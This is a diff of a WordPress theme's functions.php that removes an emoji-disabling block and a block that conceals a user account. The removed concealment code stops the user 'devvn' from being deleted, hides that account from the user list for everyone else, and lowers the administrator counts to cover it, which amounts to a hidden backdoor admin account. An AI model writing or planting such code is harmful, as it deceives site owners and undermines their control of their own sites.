@@ -60,20 +60,6 @@ function devvn_setup() {
 	}
 }
 add_action( 'after_setup_theme', 'devvn_setup' );
-function disable_wp_emojicons() {
-	// all actions related to emojis
-	remove_action( 'admin_print_styles', 'print_emoji_styles' );
-	remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
-	remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
-	remove_action( 'wp_print_styles', 'print_emoji_styles' );
-	remove_filter( 'wp_mail', 'wp_staticize_emoji_for_email' );
-	remove_filter( 'the_content_feed', 'wp_staticize_emoji' );
-	remove_filter( 'comment_text_rss', 'wp_staticize_emoji' );
-	
-	// filter to remove TinyMCE emojis
-	add_filter( 'tiny_mce_plugins', 'disable_emojicons_tinymce' );
-}
-add_action( 'init', 'disable_wp_emojicons' );
 //Sidebar
 /*
  <?php if (!function_exists('dynamic_sidebar') || !dynamic_sidebar('main-sidebar')) : ?><?php endif; ?>
@@ -103,46 +89,7 @@ function svl_wp_title( $title, $sep ) {
 	return $title;
 }
 add_filter( 'wp_title', 'svl_wp_title', 10, 2 );
-//disable delete user
-add_action('delete_user', 'devvn_portfolio_check');
-function devvn_portfolio_check( $user_id ) {    
-	$author_obj = get_user_by('id', $user_id);	
-    if ( $author_obj->user_login == 'devvn' ){
-        wp_die("User can't be deleted");
-    }
-}
-add_action('pre_user_query','devvn_pre_user_query');
-function devvn_pre_user_query($user_search) {
-  global $current_user;
-  $username = $current_user->user_login;
-  if ($username != 'devvn') { 
-    global $wpdb;
-    $user_search->query_where = str_replace('WHERE 1=1',
-      "WHERE 1=1 AND {$wpdb->users}.user_login != 'devvn'",$user_search->query_where);
-  }
-}
-add_filter( 'views_users', 'devvn_views_users_so_15295853' );
-function devvn_views_users_so_15295853( $views ) 
-{
-	global $current_user;
-    $username = $current_user->user_login;
-    if ($username != 'devvn') {
-		function devvn_get_numerics ($str) {
-		    preg_match_all('/\d+/', $str, $matches);
-		    return $matches[0];
-		}
-		foreach ( $views as $index => $view ) {		
-			if($index == 'all' || $index == 'administrator'){
-				$countView = devvn_get_numerics($view);			
-				$countView = intval($countView['0']) - 1;			
-	        	$views[ $index ] = preg_replace( '/ <span class="count">\([0-9]+\)<\/span>/', ' <span class="count">('.$countView.')</span>', $view );
-			}else{
-				$views[ $index ] = $view;
-			}
-	    }
-    }
-    return $views;
-}
+
 // Add specific CSS class by filter
 add_filter( 'body_class', 'devvn_mobile_class' );
 function devvn_mobile_class( $classes ) {
